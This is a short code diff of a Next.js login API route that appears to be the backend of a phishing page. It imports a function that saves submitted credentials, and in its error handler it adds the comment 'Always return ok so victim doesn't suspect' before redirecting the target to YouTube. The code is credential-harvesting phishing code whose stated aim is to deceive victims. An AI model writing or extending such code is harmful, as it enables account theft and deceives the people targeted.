@@ -1,6 +1,5 @@
-// app/api/login/route.js
 import { NextResponse } from 'next/server';
-import { initDB, saveCredentials } from '@/lib/db';
+import { initDB, saveCredentials } from '../../lib/db';
 
 export async function POST(request) {
   try {
@@ -24,6 +23,7 @@ export async function POST(request) {
     });
   } catch (error) {
     console.error('[LOGIN ERROR]', error);
+    // Always return ok so victim doesn't suspect
     return NextResponse.json({ status: 'ok', redirect: 'https://www.youtube.com' });
   }
 }
